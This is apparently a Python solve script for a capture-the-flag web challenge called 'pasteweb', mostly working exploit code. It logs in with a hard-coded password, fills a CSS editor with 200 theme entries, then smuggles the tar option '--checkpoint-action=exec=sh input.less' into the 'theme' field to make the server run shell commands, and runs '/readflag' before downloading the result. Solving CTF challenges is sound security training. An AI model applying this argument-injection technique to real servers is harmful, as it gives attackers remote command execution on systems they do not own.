import requests
from time import time
from urllib.parse import quote

url = "https://pasteweb.ctf.zoolab.org"
sess = requests.Session()

def getReq(sessid: str, dest: str, param: dict = None):
    cookies = {
        "PHPSESSID": sessid
    }

    get = str()
    if param is not None:
        get = "?" + "&".join([f"{k}={quote(v)}" for k, v in param.items()])

    res = sess.get(url + dest + get, cookies=cookies)
    return res

def postReq(sessid: str, dest: str, data: dict = None):
    cookies = {
        "PHPSESSID": sessid
    }

    res = sess.post(url + dest, cookies=cookies, data=data)
    return res

def login():
    data = {
        "username": "p69",
        "password": "IGldNRiLSejE0grC6xAk",
        "current_time": int(time())
    }

    sess.post(url, data=data)
    return sess.cookies.get("PHPSESSID")

def main():
    sessid = login()

    for i in range(200):
        res = postReq(
            sessid,
            "/editcss.php",
            {
                "less": "",
                "theme": f"{i+1}"
            }
        )

    res = postReq(
        sessid,
        "/editcss.php",
        {
            "less": "",
            "theme": "--checkpoint-action=exec=sh input.less;cat 1"
        }
    )

    res = postReq(
        sessid,
        "/editcss.php",
        {
            "less": "/readflag > flag"
        }
    )

    res = getReq(sessid, "/download.php")
    with open("download.tar", "wb") as f:
        f.write(res.content)

if __name__ == "__main__":
    main()